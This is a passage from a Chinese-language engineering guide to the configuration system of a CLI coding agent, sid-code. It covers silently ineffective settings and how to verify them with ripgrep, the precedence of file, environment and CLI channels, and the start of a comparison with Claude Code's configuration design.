**为什么这件事重要**：默认值是**最容易被下一个人质疑的东西**。
"为什么是 32768 而不是 65536？" —— 如果没有注释，
下一个 agent / 下一个同事会觉得这是随手写的，然后改掉它。
改掉之后可能撞回旧问题（"输出被截断了"），而没人知道这是三个月前解决过的。

> 💡 **这一条与本仓库的 `.agents/notes/` 机制是同一个思路**：
> **决策留痕的最贵损失在被否决的方案上**——
> 如果"为什么不用 16384"只活在某个人的记忆里，
> 下一个人明天就会重新提议它，而你要把整套论证重做一遍。

### 10.6 默认值四陷阱汇总

| # | 陷阱 | 失效形态 | 解法 |
| --- | --- | --- | --- |
| 1 | 两个定义点 | 两人看同一份代码得出相反结论 | 唯一定义点 + 跨模块引用 |
| 2 | 默认值被翻转，文档没跟上 | 照文档配得到相反行为 | 从源码生成参考文档 + pre-commit 校验 |
| 3 | `0`/`[]`/`{}` 语义不明 | 用户明确表达"关闭"被当成"没配" | schema 三问；`.nonnegative()` vs `.positive()` 按"关闭是否合理选择"判 |
| 4 | 合并跳过空值 → 无法清空 | 环境变量清不掉配置文件的值 | 刻意权衡；清空走改文件 |

### 10.7 本章自检

- `debug` 的两个默认值定义点各在哪条链上？为什么这会让两个人得出相反结论？
- 默认值翻转为什么"长得不像破坏性变更"？三条缓解手段的有效性排序？
- `maxSessionDurationMs` 用 `.nonnegative()`、`streamTimeouts` 用 `.positive()`——判据是什么？
- 写 schema 时对可选字段的三个自检问题是什么？第 3 问为什么最关键？
- 为什么"用环境变量清空字段"这个需求被刻意放弃了？
- 为什么默认值的选择理由必须写在定义点旁边？

## §11 ★ 「配了不生效」：本文最值钱的一章

前面十章讲的是配置系统**应该怎么工作**。这一章讲**它怎么静默地不工作**。

为什么这一章最值钱：前面所有失效模式都有症状（报错、行为不对、性能差）。
这一章的失效模式**没有症状**——用户写了配置、文件没报错、
schema 校验通过、启动正常，然后那个字段**什么也没做**。

而且这类问题有一个可怕的性质：**它在文档里长得和正常字段一模一样**。

### 11.1 五种「配了不生效」的形态

按成因分五类，每一类都有 sid-code 的真实实例。

#### R1 🔴 死字段：schema 有声明，全仓无读取点

最纯粹的一类。**字段在 schema 里、能过校验、写了不报错、但没有任何代码读它。**

sid-code 的实例（`配置参考.md` §20 汇总，本次实读复核）：

| 字段 | 状态 | 判据 |
| --- | --- | --- |
| `permissions.defaultMode` | schema 声明在 `settings/types.ts:30`，**全仓无读取点** | `rule-loader` 只读 `allow`/`deny`/`ask`；`command/permissions.ts:62` 只是写入时保留它 |
| `ide.autoInstallExtension` | Config 有声明（`config.ts:628`），**该行是全仓唯一出现处** | 实读 `rg -n "autoInstallExtension"` 只有 1 个命中 |

**`permissions.defaultMode` 这条尤其阴**，因为：

- 它的名字看起来完全合理（"权限的默认模式"）
- **真正生效的是顶层 `permissionMode`**，两个字段名极其相似
- 用户配了 `permissions.defaultMode` 之后，权限模式仍是 `default`，
  而他会以为自己配好了

**这就是死字段的典型危害形态**：它不只是"不生效"，
它还**吸走了本该配到正确字段上的配置**。

#### R2 🟠 预留字段：有消费点，但下游能力不存在

比 R1 好一点——链路接通了，但终点是空的。

实例：`fastMode`（`config.ts:357-361`）。
`配置参考.md` 记录它「**当前为预留**：网关未提供对等 fast 能力，已透传到 fallback 层待生效」。

**它和 R1 的区别**：R1 是链路断在第一步（没人读），
R2 是链路完整但**最后一环的外部依赖不存在**。

**为什么要区分**：修法完全不同。R1 要么接线要么删字段；
R2 什么都不用改——**等外部能力到位它自动生效**。
把 R2 误判成 R1 去"修"，会写出一堆用不上的代码。

#### R3 🟠 枚举合法但无触发点

一个字段的**取值范围**里有一部分是死的。

实例：Hook 事件名。`配置参考.md` §5 记录：
**32 类事件名里只有 17 类当前有真实触发点**，另外 15 类
（`notification`、`stop_failure`、`setup`、`permission_denied`、`config_change`、
`file_changed`、`cwd_changed`、`task_created`、`task_completed`、`elicitation`、
`elicitation_result`、`BeforePermissionCheck`、`AfterPermissionCheck`、
`BeforeHookExecution`、`AfterHookExecution`）
**枚举已定义、能过校验、但没有任何调用点**。

用户给 `notification` 事件配了一个 hook，**它永远不会被调用**。

**这一类最难自查**，因为你要证明的是"这个枚举值在代码里没有对应的 emit"，
而不是"这个字段没人读"。字段确实有人读（hook 系统读 `hooks` 字段），
只是**读到的那个 key 没人 emit**。

**sid-code 在这一点上做得好**：官网 `ref/hooks.md` **显式标注了这 15 个"配了不会被调用"**。
`配置参考.md` §19.4 给了这个评价：

> `ref/hooks.md` 的 32 类事件 / 17 类有触发点，与源码一致，
> 且明确标注了"配了不会被调用"的那 15 个——**这是本次核查里信息质量最高的一页**。

**为什么这个标注这么值钱**：它把一个不可能自查的问题变成了可查的。
没有它，用户唯一的验证方式是"配上试试看"——而 hook 不触发和 hook 触发了但没输出，
在用户视角是一样的。

#### R4 🟡 静默不生效：拼错字段名

§8.7 讲过的 `.passthrough()` 代价。用户写 `"permisionMode"`（少一个 s）：
schema 放过、无人读取、静默失效。

**这一类和 R1 的区别在归因难度**：R1 是系统的问题（字段是死的），
R4 是用户的问题（拼错了）。但**用户视角完全一样**——都是"我配了没用"。

sid-code 的缓解手段是文档标注（§8.7 的三条手段里成本最低的那条）。

#### R5 🔴 半生效：一半路径接了，一半没接

**最危险的一类**，因为它会通过"看起来生效了"的测试。

实例（§9.4 讲过）：两个企业策略路径并存。
IT 只配了 `managed-settings.json`：

- 权限规则**生效**（`PolicyManager` 读这个文件）✅
- policy 层的 settings 字段**不生效**（链 B 的 `policySettings` 读另一个文件）❌

IT 会验证"禁掉 curl 生效了吗" → 生效了 → 认为策略部署成功。
而策略里的其他字段静默失效。

**另一个实例**（`配置参考.md` §20）：`policyLimits` 的六个 feature 开关
（§9.6 讲过）—— 策略模块只负责"查表 + 给理由"，
真正的拦截要各功能入口自己调用，任何一个忘记调就静默失效。

### 11.2 判据：唯一可靠的验证方法

上面五类的判据不同，但**验证手段只有一个**：

> **回源码找消费点。** 「配了是否生效」的唯一判据是**存在读取它的代码**，
> 而不是"schema 里有"、"文档里写了"、"参考页列了"。

`配置参考.md` 附录 B 给了标准命令：

```bash
# 验证某字段是否真有消费点（判"配了不生效"的唯一方法）
rg -n "字段名" packages/ --glob '!*.test.ts' --glob '!*/tests/*'
```

**读结果的四条纪律**：

1. **排除测试文件**。测试里引用一个字段**不构成消费点**——
   一个只有测试引用的字段是死字段的典型形态（"代码全在、调用全 0"）。
2. **排除定义点**。schema 声明、TypeScript 接口声明、默认值定义都不是消费点。
3. **命中数为 1 时高度可疑**。如果唯一命中就是声明处，那它是死字段（`ide.autoInstallExtension` 就是这个形态）。
   ⚠️ 但"1"只是**没有转发层时**的基线——有转发层的系统基线可能是 2 或更多，见 §11.3 陷阱 D。
   **先搞清基线是几，再读数字。**
4. **命中数 > 1 也不代表生效**。要看那些命中**在不在关键路径上**——
   写入时保留（`command/permissions.ts:62` 对 `defaultMode` 做的事）不是消费。

### 11.3 四个搜索陷阱（会让你得出反的结论）

上面那条命令看起来简单，但有四个坑会让你判错。前三个是常见的，第四个是本文写作时亲手撞到的。

**陷阱 A：命名不一致导致假阴性**

字段在配置里叫 `snake_case`，在代码里叫 `camelCase`（归一化之后）。
搜 `limit_usd` 可能找不到消费点，因为代码里读的是 `limitUSD`——
而 `config.ts:1128` 的归一化认两种写法。

**解法**：两种命名都搜；或者搜归一化表（`config.ts:934` 的 `keyMap`）确认映射关系。

**陷阱 B：字段被解构导致假阴性**

```ts
const { autoMemory, autoDream } = config;   // 消费点在这里
if (autoDream) { ... }                       // 但搜 "config.autoDream" 搜不到
```

**解法**：搜字段名本身（`autoDream`），不要搜 `config.autoDream`。

**陷阱 C：shell 差异导致静默零命中**

`配置参考.md` 系列文档里记过这个坑（Provider 文档 §9.7 也记了同一条）：
某些 glob 写法在 bash 下可以、**在 zsh 下静默失败**（返回零结果而不报错）。

**这是最阴的一个**，因为零结果和"确实没有消费点"长得一样，
你会直接得出"这是死字段"的结论。

**解法**：任何"零命中"的结论都要用**一个已知存在的字段**做对照实验。
搜 `availableModels`（肯定有大量消费点），如果它也返回零，那是你的命令有问题。

**陷阱 D：转发层抬高计数 + 可选链造成假阴性**

这一条是本文写作时**亲手撞到的**，值得完整讲一遍，因为它同时踩了假阳性和假阴性。

复测 §11.1 R3 那个"17 类有触发点 / 15 类没有"的结论时，第一版命令是：

```bash
rg -c "\.fireNotificationEvent\(" packages/ --glob '!*.test.ts'
```

得到的数字全都是 1、2、3 这个量级，**"有触发点"和"无触发点"的事件看起来一样**。
两个原因叠在一起：

① **转发层抬高了计数**。hook 系统有两层转发（`hook/system.ts` → `hook/event-handler.ts`），
每个事件在两层里各有一处。所以**计数 1 意味着"只有转发层、零业务调用方"**，
而不是"有一个调用方"。不排除这两个文件，所有事件的基线都被抬到 1~2。

② **可选链造成假阴性**。业务侧真实的调用点长这样（`query/tool-executor.ts:1028`）：

```ts
const hookResult = await deps.hookSystem.firePermissionRequestEvent?.(
```

`?.(` 而不是 `(`。`\.fireXxx\(` 这个模式**匹配不到它**——
于是 `permission_request` 被误判成"零业务调用方"。

修正后的口径（排除转发层 + 允许可选链）：

```bash
rg -n "\.fireXxxEvent(\?\.)?\(" packages/ --glob '!*.test.ts' --glob '!*/tests/*' \
  | grep -v 'hook/system.ts\|hook/event-handler.ts' | wc -l
```

这一版跑出来：28 个 fire 方法里 **17 个有业务调用方、11 个为零**；
另有 4 个枚举值（`BeforePermissionCheck` / `AfterPermissionCheck` /
`BeforeHookExecution` / `AfterHookExecution`）**连 fire 方法都不存在**。
11 + 4 = 15。**与原结论逐项吻合。**

**两条可迁移的教训**：

- **有转发层时，"计数 ≥ 1"不是判据，"计数 > 转发层数"才是。**
  先搞清基线是几，再读数字。这和 §11.2 的"排除定义点"是同一条原则的延伸——
  转发层就是一种定义点。
- **调用点的语法形态比你以为的多**：`.f(`、`.f?.(`、`await this.x.f(`、
  解构后裸调 `f(`、`obj["f"](`。**匹配模式越紧，假阴性越多**——
  而假阴性的方向恰好是"得出死字段的结论"，也就是会让你去删活代码。
  宁可先用宽模式（只搜方法名）拿到超集，再人工看那些命中在不在关键路径上。

> ⚠️ **这条纪律可以推广**：
> **任何"零命中/零触发/零调用"的结论，都必须先做阳性对照。**
> 否则你无法区分"真的是零"和"我的测量方法坏了"。
> 这和评测领域的"验证器恒返 0"、可观测领域的"零触发有两种成因"是同一条原则。

### 11.4 三个递进的陷阱：存在 ≠ 生效 ≠ 在用

即使你正确找到了消费点，还有三层递进的问题：

| 层 | 问题 | 例子 |
| --- | --- | --- |
| ① **存在** | 代码在仓库里吗？ | `disk-usage.ts` 的 `collectDiskUsage()` 在 |
| ② **接线** | 有生产调用点吗？ | **没有** —— `sid-code配置目录文件全景与清理指南.md` §0 结论二实测："`collectDiskUsage()` 只有测试在调用，零生产入口" |
| ③ **在用** | 真实会话里被触发过吗？ | 需要轨迹数据才能答 |

**这三层是递进的**：① 成立不代表 ② 成立，② 成立不代表 ③ 成立。

`collectDiskUsage()` 那个案例值得完整讲，因为它是"代码全在、调用全 0"的教科书形态：

> 仓库里**已经有一个专门回答"我的 `~/.sid-code` 为什么占 N MB"的模块**
> （`config/disk-usage.ts`，含权威保留策略登记表），
> 但它 `collectDiskUsage()` **只有测试在调用，零生产入口**——
> 没有任何 CLI 命令 / 斜杠命令能让用户看到这张表。
> 用户"对这些文件一无所知"这件事，本身就是一个**已实现但未接线的能力**造成的。

**这个形态的可怕之处**：

- 代码质量很好（有权威登记表、有测试）
- 测试全绿
- 从 code review 的角度看，这个 PR 完全合格
- **但它对用户的价值是零**

判据（本仓 CLAUDE.md 里有一条对应的铁律）：

> **新增防线/能力时的验收判据**：不是「build 过 + 单测过」，
> 而是**「真实会话里被触发过」**——防线自己成了它当初要消灭的死功能，这事已经发生过。

### 11.5 一个真实的对账结果：官网参考页的四类缺口

`配置参考.md` §19 做了一次源码 vs 官网参考页的完整对账。结果值得作为**方法论样本**读：

| 缺口类型 | 数量 | 成因 |
| --- | --- | --- |
| 字段可配但参考页未列 | 4 个（`autoDream` / `autoMemory` / `conflictDetection` / `conflictSeverity`） | 生成器的白名单策略是**显式列举**，这 4 个漏登了 |
| 环境变量未收录 | ≥12 个 | 参考页的口径是"取自 `--help` 环境变量段"，而 `--help` 本身没写这些——**缺口在 `help.ts`，生成器忠实反映了源** |
| CLI 参数取值漏列 | 1 处（`--output-format` 漏 `stream-json`） | 手写描述与实际消费点不一致 |
| **无缺陷的部分** | `ref/hooks.md` | 32/17 的标注与源码一致 |

**第二行那个结论最值得学**：生成器没错，`--help` 没写全。
如果只看"参考页缺了 12 个变量"，会去修生成器——**修错了地方**。

> 💡 **这是一条通用的调研纪律**：
> **发现"生成物有缺口"时，先确认生成器的口径是什么。**
> 生成器忠实反映了一个不完整的源，和生成器本身有 bug，修法完全不同。

而第一行的判据也值得记：那 4 个字段被判为"漏项"的依据是**同时满足三条**——
① Config 有声明 ② settings.json 写了能生效 ③ **有真实消费点**。
第三条就是 §11.2 的判据。**没有第三条，你无法区分"漏登的真字段"和"该被排除的死字段"。**

生成器的白名单策略本身是对的（`docs-gen-reference.ts:466` 的理由）：

> Config 里大半是"运行时字段，不落盘"，倒进来会造出"写了也没用"的假字段，
> **比漏写更糟**。

**"比漏写更糟"这个判断是对的**：漏写的字段用户搜不到、会来问；
假字段用户会照着配，然后静默失效。**后者的排查成本高一个量级。**

### 11.6 把这一章收成五条纪律

| # | 纪律 | 反面 |
| --- | --- | --- |
| 1 | **判"配了是否生效"只看消费点**，不看 schema / 文档 / 参考页 | 相信文档，然后配了半天没用 |
| 2 | **排除测试引用**。只有测试调用 = 零生产入口 | 看到有引用就认为接线了 |
| 3 | **任何"零命中"结论先做阳性对照** | 搜索命令在当前 shell 下静默失效，你却下了"死字段"的结论 |
| 4 | **有转发层时先搞清基线是几**；匹配模式宁宽勿紧 | 把"只有转发层"读成"有一个调用方"；`?.(` 形态漏匹配 → 误判死字段 → **去删活代码** |
| 5 | **区分 存在 / 接线 / 在用 三层** | 代码质量很好、测试全绿、对用户价值为零 |

### 11.7 本章自检

- 五种"配了不生效"的形态各是什么？R1 与 R2 的区别为什么影响修法？
- `permissions.defaultMode` 为什么比普通死字段更危险？
- R3（枚举合法但无触发点）为什么最难自查？sid-code 怎么缓解的？
- R5（半生效）为什么会通过测试？
- 判"配了是否生效"的唯一判据是什么？读搜索结果的四条纪律？
- 四个搜索陷阱各是什么？陷阱 C 为什么最阴？陷阱 D 为什么同时踩了假阳性和假阴性？
- "存在 / 接线 / 在用"三层各怎么验证？`collectDiskUsage()` 卡在哪一层？
- 为什么"假字段比漏写更糟"？

## §12 三条通道：文件 / 环境变量 / CLI

前面十一章讲的都是**文件**这条通道。这一章补上另外两条，
并回答一个容易被当成"显然"的问题：**为什么需要三条，它们能不能互相替代。**

### 12.1 三条通道的基本优先级

链 A 的优先级（`config.ts:1401-1404`）：

```ts
let merged = mergeConfig(defaults, fileConfig);   // ① 默认值 → 文件
merged = mergeConfig(merged, envConfig);          // ② → 环境变量
merged = mergeConfig(merged, cliArgs);            // ③ → CLI 参数
```

```
默认值  →  配置文件  →  环境变量  →  CLI 参数
 最低                                  最高
```

**记住顺序的心智模型和 §3 是同一条**：**越靠近"当下这一次"的越优先**。
配置文件跨会话持久，环境变量跨命令但限于这个 shell，CLI 参数只属于这一次执行。

### 12.2 为什么三条都不能省：能力不重叠

初学者会问"有了文件为什么还要环境变量"。因为三条通道的**能力和使用场景不重叠**：

| 通道 | 独有能力 | 典型场景 | 不能做什么 |
| --- | --- | --- | --- |
| **文件** | 表达**结构化**配置（嵌套对象、数组） | 模型注册表、hook 定义、MCP 服务器 | 不方便临时改；不方便按环境切换 |
| **环境变量** | **不改文件**就能改行为；能被 CI / 容器 / 脚本注入 | Docker 镜像里注入 API key；CI 里关掉遥测 | 只能表达**扁平字符串**；不能表达嵌套结构 |
| **CLI 参数** | **单次生效**，可发现（`--help`）、可组合 | `--print` 单次无头执行；`--max-turns 3` 限一次 | 不持久；参数太多时不可读 |

**结构化能力是文件的护城河**。`availableModels` 是一个对象数组，
每个对象有 12 个字段。用环境变量表达它需要 `MODEL_0_NAME`、`MODEL_0_API_KEY`……
这种做法在 12-factor app 里常见，但对一个有嵌套配置的 CLI 工具是灾难。

**注入能力是环境变量的护城河**。容器镜像不该内嵌 API key；
CI runner 不该有一份 `settings.json`。环境变量是这些场景**唯一**干净的注入点。

**单次性是 CLI 的护城河**。`--print` 表达的是"这一次用无头模式"——
它不该被持久化到任何文件（否则下次交互式启动就坏了）。

### 12.3 键名归一：三条通道的写法必须能对上

三条通道对同一个字段有三种写法习惯：

| 通道 | 习惯写法 | 例子 |
| --- | --- | --- |
| 文件（JSON） | camelCase | `maxTokens` |
| 文件（YAML 风格 / 旧格式） | snake_case | `max_tokens` |
| 环境变量 | SCREAMING_SNAKE + 前缀 | `SID_MAX_OUTPUT_TOKENS` |
| CLI | kebab-case | `--max-tokens` |

`config.ts:930` 的 `normalizeConfigKeys` 负责把前两种归一到 Config 接口的 camelCase。
它的策略（`config.ts:1013`）是：

```ts
const configKey = keyMap[yamlKey] || yamlKey;    // 查表命中用映射，否则原样透传
```

**"否则原样透传"是关键**：camelCase 字段**不需要登记进 keyMap 也能通过**
（因为 Config 接口本来就用 camelCase）。keyMap 里的条目主要是给 snake_case 别名用的。

**这个设计有一个必须知道的后果**：keyMap 里漏登一个 snake_case 别名，
用户用 snake_case 写那个字段就会**静默失效**（透传后变成一个 Config 接口不认识的键）。
源码里有三条这样的前科记录（`config.ts:1020-1035`）：

```
// 别名→真名映射（缺省时 resolveWireModel 回落 name）。这里漏一个字段就等于
// 用户配了 model_id 却被静默丢弃 → 别名当模型名发给厂商 400（pricing 有前科）。
```

三个前科字段：`model_id`（漏了 → 别名当真模型名发出去 → 400）、
`pricing`（漏了 → 用户自配价被静默丢弃 → 架空"用户手写价最高优先"这条设计）、
`compat`（同理）。

**这三个前科的共同形态**：归一化表漏一项 = 一个字段静默失效。
而它是 §11 那五类里的 R4（静默不生效）的一个**系统性版本**——
不是用户拼错，是**系统的映射表不全**。

**缓解手段**（`config.ts:1030-1032` 采用的）：**透传原始对象而不是逐字段转键**：

> `compat` 的内部键两种风格都要认，归一化在 `model-compat.ts`（合法键集合的单一真相源）。
> 这里透传原始对象而不是自己转键：**转键逻辑写两份必然漂移**，
> 而漏一个键就是用户配了却被静默丢弃。

这又回到 §5.3 和 §10.1 的同一条原则：**"应该一样"的两份东西迟早不一样。**
解法是让下游模块成为唯一真相源，上游只做透传。

### 12.4 环境变量的三个非对称性

环境变量不是"文件的扁平版本"，它有三个方向上的**不对称行为**，每个都值得记。

**① 有些变量只能开不能关**

`config.ts:1284`：

```ts
if (env.SID_CODE_TRACE === "1" || env.SID_CODE_TRACE === "true") {
  base.trace = { enabled: true, ... };
}
```

**只有值为 `1`/`true` 时才写入 `base.trace`。** 设 `SID_CODE_TRACE=0` **不会**关闭 trace——
它只是"没有开启"，而 trace 的默认值已经是 `true`（`config.ts:894`）。

想关 trace 只能改配置文件。这是**默认值翻转（§10.2）遗留的一个不对称**：
这段 env 解析代码写在 `trace.enabled` 默认还是 `false` 的时代，
那时"只认开启信号"是合理的。默认值翻成 `true` 之后，这段代码就变成了单向阀。

**② 有些配置只认环境变量，文件里没有对应字段**

`network-profile.ts:307-328` 的 side-call 超时子表（`warmupMs` / `compactMs` /
`collapseSegmentMs` / `recallMs` / `titleMs` / `gatewayPricingMs`）：

```ts
export function resolveSideCallTimeouts(): SideCallTimeouts {
  return {
    warmupMs: readEnvMs("SID_CODE_WARMUP_TIMEOUT_MS") ?? SIDE_CALL_DEFAULTS.warmupMs,
    ...
  };
}
```

**只有 `env > 默认值`两层，没有 settings.json 那一层。**
这不是遗漏——这六项是内部子调用的超时，正常用户不需要调，
留一个 env 出口给排查场景就够了。**"可配置性要有边界"的另一个实例**（§3.4 讲过一次）。

**③ 有些模块刻意不读配置文件**

`network-profile.ts:339-346` 记了一个架构决定：

> 两种修法里选了注册快照：
> - ✗ 让 network-profile 直接 `getSettings()`：本文件**刻意不依赖 Config/settings**
>   （避免与 `config.ts` 的双向类型依赖），且会给 provider 热路径引入一次磁盘读。
> - ✓ 由已经持有 `config.network` 的启动路径**注册一次**，provider 侧只读内存。

**为什么这条重要**：它说明"配置怎么到达消费方"本身是个设计问题。
Provider 实例只持有 `baseURL` / `apiKey`，读不到 settings。
三种解法：

| 解法 | 代价 |
| --- | --- |
| Provider 直接读 settings | 循环依赖 + 热路径磁盘读 + 缓存失效时机不可控 |
| 把 settings 传进 Provider 构造函数 | 每个 Provider 都要改签名，且 SDK 用法被迫传一个它不关心的参数 |
| **启动时注册进程级快照，Provider 读内存**（采用） | 需要保证注册发生在使用之前；未注册时行为要**逐字节不变** |

采用方案的关键约束（`network-profile.ts:345`）：
**未注册时行为逐字节不变**（回退 env > 默认）——
这让直接 `new OpenAIProvider()` 的测试和 SDK 用法不受影响。

> 💡 **这是一个可迁移的模式**：当一个热路径模块需要配置、但不该依赖配置系统时，
> 用"**启动期注册 + 运行期只读内存 + 未注册时退化到独立默认**"这个三段式。
> 关键是第三段——**它让这个模块保持可独立使用**。

### 12.5 CLI 参数的独有职责：只属于这一次的东西

有一类配置**只应该从 CLI 来**，因为持久化它们没有意义甚至有害：

| 参数 | 为什么不该持久化 |
| --- | --- |
| `--print` / `-p` | 持久化后交互式启动会直接退出 |
| `--continue` / `--resume` | "继续上次会话"是一次性动作 |
| `--json-schema` | 一次结构化输出的 schema |
| `--max-turns` | 通常是为某个具体任务限流 |

`配置参考.md` §21 把这些归为**运行时字段**：只从 CLI / 环境变量来，**不落盘**。

**这个分类的价值**在 §11.5 已经出现过：官网参考页的生成器**刻意不把 Config 全字段倒进来**，
理由是"Config 里大半是运行时字段，倒进来会造出'写了也没用'的假字段，比漏写更糟"。

所以"运行时字段"这个概念不只是文档分类，**它是防止制造假字段的判据**。

### 12.6 一个容易被忽略的第四条通道：斜杠命令

严格说还有第四条：**运行时斜杠命令**（`/model`、`/theme`、`/effort`、`/think`）。

它和前三条的关系值得说清，因为它引出了一个设计区分：

| 形态 | 例子 | 作用域 |
| --- | --- | --- |
| **纯运行时** | `/model` 切模型（不加 `-p`） | 仅本次会话，进程退出即失效 |
| **持久化** | `/effort -p`、`/theme` | 写 settings.json（走 `patchSettingsFile`，§6） |

**关键区分**（`config.ts:237-245` 的注释）：
`effortLevel` / `thinkingEnabled` 这类字段在 settings.json 里的值**仅作启动初值**，
运行时态存在别的地方（`App.runtimeEffort`）。

**为什么要这样分**：如果运行时切换直接改 config 对象，
那么"这次临时调高推理强度"和"我希望默认就是高"就无法区分了。
分成"启动初值"和"运行时态"两个变量，`-p` 标志决定要不要把运行时态写回启动初值。

`maxTokens` 也有类似机制（`config.ts:1461-1466` 的 `_explicitMaxTokens`）：
显式设过会被记下来，使运行时 `/model` 切换能区分
**"用户刻意设的"**与**"上个模型推导出来的残留值"**。

> ⚠️ **这是一个通用需求**：**任何可以在运行时改的配置，都需要区分"用户显式给的"
> 和"系统推导的"**。否则系统的推导值会在下一次推导时被当成用户意图而保留下来。
> 判据：**如果一个值可能来自推导，就必须有一个标记说明它是不是推导来的。**

### 12.7 四条通道汇总

```
持久性 ──────────────────────────────────────────────────►
  低                                                    高

┌──────────────┐  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐
│ 斜杠命令      │  │  CLI 参数     │  │  环境变量    │  │   配置文件     │
│ (不带 -p)    │  │              │  │             │  │               │
│              │  │              │  │             │  │               │
│ 本次会话      │  │  本次执行     │  │  本 shell   │  │  跨会话持久    │
│              │  │              │  │             │  │               │
│ 能表达：      │  │  能表达：     │  │  能表达：    │  │  能表达：      │
│ 交互式选择    │  │  扁平值+开关  │  │  扁平字符串  │  │  任意嵌套结构  │
└──────────────┘  └──────────────┘  └─────────────┘  └───────────────┘
       │                 │                │                  │
       └── 加 -p 时 ─────┴────────────────┴──────────────────►│
           写回文件                                            │
                                                              │
优先级（运行时生效顺序）：文件 < 环境变量 < CLI < 斜杠命令（运行时态）
```

**注意持久性和优先级方向相反**：越不持久的优先级越高。
这个反向关系是对的——**越具体、越临时的指令，越应该赢**。

### 12.8 本章自检

- 三条通道的优先级顺序是什么？记住它的心智模型是什么？
- 每条通道的"护城河"（独有能力）分别是什么？
- keyMap 漏登一个 snake_case 别名的后果是什么？三个前科字段各是什么形态？
- 为什么 `compat` 选择"透传原始对象"而不是逐字段转键？
- `SID_CODE_TRACE=0` 能关掉 trace 吗？为什么会有这个不对称？
- side-call 超时为什么只有 env 一条通道？
- `network-profile` 为什么刻意不读 settings？采用的三段式模式是什么？第三段为什么关键？
- "运行时字段"这个分类除了文档意义还有什么判据价值？
- `_explicitMaxTokens` 这个标记解决什么问题？它的通用形态是什么？

## §13 两家横向对比：同一个问题，两种规模

这一章把 sid-code 和 Claude Code 的配置系统摆在一起。
**目的不是评优劣**——两者面对的规模不同，所以最优解不同。
目的是让你看清**哪些设计是规模驱动的、哪些是普适的**。

### 13.1 规模差异先说清

| | sid-code | Claude Code |
| --- | --- | --- |
| 部署形态 | 本地 CLI（一种） | CLI + 桌面宿主 + SSH 远程 + IDE 扩展 |
| 企业管控通道 | 单文件（`/etc/` 或 `~/`） | Remote API + MDM(plist/注册表) + 文件 + HKCU |
| 用户规模 | 内部/小团队 | 公开发布，跨 macOS/Windows/Linux |
| 配置来源数 | 5（无 plugin 层） | 6（多一层 Plugin Settings 作为 base） |
| feature flag | 无 | GrowthBook 远程下发 + 五级优先级链 |

**先记住这个差异**，否则会得出"sid-code 缺很多东西"这个不准确的结论。
sid-code 的 `settings/constants.ts:9-12` 显式记录了这些取舍是**主动决策**：

> 设计决策：
> - 不引入 Plugin Settings 层（sid-code 暂无独立插件 Settings 生态）
> - Policy Settings 简化为单文件 `/etc/sid-code/policy.json`（暂不需要 MDM/远程下发）

**把"暂不需要"写在代码里，比留一个空实现好**——后者会被误读为"做了但没做完"。

### 13.2 逐项对比

| 维度 | sid-code | Claude Code | 差异是规模驱动还是设计取向 |
| --- | --- | --- | --- |
| **双轨制** | Settings + AppConfig | Settings + Config（`claude.json`） | **一致** —— 这是普适设计 |
| **来源优先级** | 5 源，数组顺序即优先级 | 6 源，同样是数组顺序 | **一致**（多的那层是 plugin） |
| **合并语义** | 自写 `mergeSettingsRead/Write`（无 lodash） | `lodash.mergeWith` + customizer | **等价**，只是依赖取向不同 |
| **数组语义** | 字符串数组拼接去重 / 对象数组拼接 | 同 | **一致** |
| **信任边界** | 9 个安全敏感字段 + env 两清单两阶段 | 同思路，env 多三个契约过滤器 | **规模驱动**（部署形态多） |
| **缓存** | 三级（会话 / 单源 / 文件解析） | 三级（内存 / watchFile / 磁盘） | **思路一致，分层维度不同** |
| **变更检测** | `fs.watch` 监听目录 + 稳定性 + 删除宽限 | `fs.watchFile` 轮询 + chokidar + MDM 30min 轮询 | **规模驱动**（要支持 NFS / 注册表） |
| **企业管控** | 单文件，`PolicySource` 类型已留 remote/mdm 位 | 四通道 first-source-wins + checksum/ETag | **规模驱动** |
| **feature flag** | 无 | GrowthBook 五级链 + 阻塞/非阻塞双 API | **规模驱动** |
| **写入保护** | `patchSettingsFile` + 运行时明文凭证检测 | 锁 + Auth-Loss Guard + 备份 | **各有侧重**（见下） |

### 13.3 三处值得学的差异

**① sid-code 独有：写入时的明文凭证运行时检测**

§6.3 讲的那个 `detectSensitiveData` 护栏，CC 侧文档里没有对应物。
它解决的是一个**很具体的**问题（`resolveEnvVars` 展开后整体写回 = 明文落盘），
这个问题的存在前提是"支持 `${VAR}` 占位符 + 读取时展开"这个组合。

**普适价值**：只要你的配置系统支持"占位符 + 读取时展开"，
就必须在写入侧加护栏。这个组合本身是好设计（避免明文落盘），
但它和 round-trip 写入是**互相矛盾的两个特性**，必须有一方让步。

**② CC 侧独有：Auth-Loss Guard + 多进程写入锁**

sid-code 的 `saveAppConfig`（`app-config.ts:291`）有 Auth-Loss Guard 和备份，
但**没有跨进程文件锁**——它用的是 `updater` 函数模式：
每次写入前重读磁盘、基于最新状态更新（`app-config.ts:296-300`）。

这个模式能缓解并发但不能消除竞态（读和写之间仍有窗口）。
CC 侧用了显式锁。**这是规模驱动的**：用户越多，越可能有人开 5 个终端。

**判据**：`updater` 模式够不够，取决于**冲突的后果**。
`numStartups` 少加一次无所谓；`oauthAccount` 被覆盖就要重新登录。
CC 侧的用户规模让后者变成必然会发生的事。

**③ CC 侧独有：GrowthBook 的阻塞/非阻塞双 API**

CC 侧提供两套读 feature flag 的 API（CC 侧口径）：

```ts
getFeatureValue_DEPRECATED(feature, defaultValue)          // 阻塞：等初始化完成
getFeatureValue_CACHED_MAY_BE_STALE(feature, defaultValue) // 非阻塞：可能返回旧值
```

**这个命名本身就是设计文档**：`_DEPRECATED` 明示"新代码别用"，
`_CACHED_MAY_BE_STALE` 明示"你拿到的可能是旧值，你要能接受"。

**普适价值**：**把契约写进函数名**。一个叫 `getConfig()` 的函数，
调用方无法知道它会不会阻塞、会不会返回旧值。
两个分别叫 `..._BLOCKS_ON_INIT` 和 `..._CACHED_MAY_BE_STALE` 的函数，
调用方选错的概率大幅下降。

sid-code 有一个类似但更轻的做法：`writeSettingsFile` 标了 `@deprecated`，
且在 JSDoc 里写"⚠️ **危险 API——绝大多数场景应使用 `patchSettingsFile()` 替代**"。
**但注释挡不住误用（§6.3 的教训），最后还是加了运行时护栏。**
—— 这两个案例合起来给出一条经验：

> **命名 + 注释能降低误用概率，但不能消除它。**
> 后果不可逆的误用必须做成运行时护栏。

### 13.4 一处 sid-code 更清晰的地方：文件拆分的职责边界

CC 侧的 MDM 模块拆成三个文件，理由是**启动性能**（CC 侧口径：
